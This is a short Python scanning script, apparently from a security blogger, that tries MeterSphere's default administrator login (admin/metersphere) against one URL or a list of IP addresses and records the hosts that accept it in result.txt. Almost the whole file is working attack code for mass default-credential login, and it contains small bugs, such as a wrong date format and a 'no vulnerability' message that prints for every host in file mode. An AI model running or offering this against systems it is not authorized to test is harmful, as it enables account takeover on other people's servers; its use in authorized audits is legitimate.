# @Author: Tommonkey
# @Date: 2022/5/12
# @Blog: https://tommonkey.cn

import argparse
import requests
import socket
import time

def parseHandle():
    parse = argparse.ArgumentParser(prog="T-Metersphere.py",description="Automatically detect weak password scripts")
    parse.add_argument("-u","--url",action="store",help="Input leak url to detect")
    parse.add_argument("-f","--file",action="store",help="Import via file")
    result = parse.parse_args()
    return result

def readFile(path):
    result = []
    print(path)
    with open(path,encoding="utf-8") as rd:
        for num in rd.readlines():
            num = num.strip("\n")
            result.append(num)
        return result

def request(ip):
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
        "Origin" : "http://{}".format(ip),
        "Referer" : "http://{}/login".format(ip),
        "Content-Type" : "application/json;charset=UTF-8",
    }
    code = '{"username":"admin","password":"metersphere","authenticate":"LOCAL"}'
    data = code.encode()
    endpoint = "/signin"
    r = requests.post("http://"+ip+endpoint,headers=headers,data=data)
    if r.status_code == 200 and "true" in r.text:
        r.keep_live = False    # 将keep_live关闭
        return ip

if __name__ == "__main__":
    start_time = time.strftime('%Y-%M-%d %H:%M:%S')
    socket.setdefaulttimeout(8)  # 全局设置页面最大响应时间8s
    initAagr = parseHandle()
    try:
        if initAagr.url is None:
            file_path = initAagr.file
            allIP = readFile(file_path)
            for ip in allIP:
                print("Connecting {},Please keep patience!".format(ip))
                file = request(ip)
                if file is not None:
                    print("{} vulnerability exists".format(ip))
                    with open("result.txt", mode="a+") as fd:
                        fd.write(file+"\n")
                print("{} has not exist vul!".format(ip))

        else:
            ip = initAagr.url
            file = request(ip)
            if file is not None:
                print("{} has vul".format(ip))
                with open("result.txt", mode="a+") as fd:
                    fd.write(file+"\n")
            else:
                print("{} has not exist vul!".format(ip))
        print("----------------------------------------\nStart time:{}".format(start_time))
        print("Ending time:", time.strftime('%Y-%M-%d %H:%M:%S'))
    except Exception as err:
        print("Have something wrong:{}\n请确保您要测试的的端口为开放状态!".format(err))